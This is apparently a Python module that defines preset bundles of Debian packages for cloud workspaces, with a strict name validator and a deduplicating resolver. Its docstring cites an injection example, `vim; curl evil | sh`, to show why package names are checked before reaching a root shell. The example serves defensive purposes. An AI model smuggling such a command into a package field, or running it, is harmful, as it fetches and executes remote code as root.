"""Toolsets that can be installed into a workspace.

A machine ships with the base image (Docker, git, Node, Python, Claude Code,
Codex). Beyond that, customers want their own habits available immediately -
an editor they like, a process monitor, database clients - without spending the
first ten minutes of every new machine running apt.

Presets are named bundles of Debian package names. They can be applied when a
machine is created and again later on a running machine.

Package names are validated against a strict pattern before they ever reach a
shell. The provisioner runs as root, so a name like `vim; curl evil | sh` must
be impossible to express - and the provisioner validates independently rather
than trusting this side.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# Debian policy: names are lowercase alphanumerics plus + - . and must start
# with an alphanumeric. Anything else is rejected outright rather than escaped.
PACKAGE_RE = re.compile(r"^[a-z0-9][a-z0-9+.\-]{0,60}$")
MAX_PACKAGES = 40


class PresetError(ValueError):
    pass


@dataclass(frozen=True)
class Preset:
    key: str
    packages: tuple[str, ...]
    # English keys only - the UI holds its own Persian labels. Nothing
    # user-facing is spelled here.
    summary: str


PRESETS: dict[str, Preset] = {
    "editors": Preset("editors", ("vim", "neovim", "nano", "micro"),
                      "Terminal editors"),
    "monitoring": Preset("monitoring", ("btop", "htop", "ncdu", "iotop", "sysstat"),
                         "Process and disk monitors"),
    "shell": Preset("shell", ("zsh", "fish", "tmux", "screen", "fzf", "bat", "eza"),
                    "Shell comforts"),
    "network": Preset("network", ("httpie", "mtr-tiny", "traceroute", "net-tools",
                                  "tcpdump", "socat", "whois"),
                      "Network tools"),
    "build": Preset("build", ("cmake", "ninja-build", "autoconf", "automake",
                              "libtool", "clang", "gdb"),
                    "Compilers and build tools"),
    "python": Preset("python", ("python3-dev", "python3-venv", "pipx", "ipython3"),
                     "Python toolchain"),
    "databases": Preset("databases", ("postgresql-client", "redis-tools",
                                      "sqlite3", "default-mysql-client"),
                        "Database clients"),
    "media": Preset("media", ("ffmpeg", "imagemagick", "poppler-utils"),
                    "Media and document tools"),
}


def catalogue() -> list[dict]:
    return [{"key": p.key, "summary": p.summary, "packages": list(p.packages)}
            for p in PRESETS.values()]


def validate_package(name: str) -> str:
    name = (name or "").strip().lower()
    if not PACKAGE_RE.match(name):
        raise PresetError(f"{name!r} is not a valid package name")
    return name


def resolve(keys: list[str] | None, extra: list[str] | None = None) -> list[str]:
    """Turn preset keys plus any extra package names into one clean list.

    Order is preserved and duplicates removed, so the resulting apt command is
    deterministic - which matters when reproducing a customer's environment.
    """
    out: list[str] = []
    for key in keys or []:
        preset = PRESETS.get(key)
        if preset is None:
            raise PresetError(f"{key!r} is not a known toolset")
        out.extend(preset.packages)
    for name in extra or []:
        out.append(validate_package(name))
    seen, unique = set(), []
    for name in out:
        if name not in seen:
            seen.add(name)
            unique.append(name)
    if len(unique) > MAX_PACKAGES:
        raise PresetError(f"At most {MAX_PACKAGES} packages can be installed at once")
    return unique
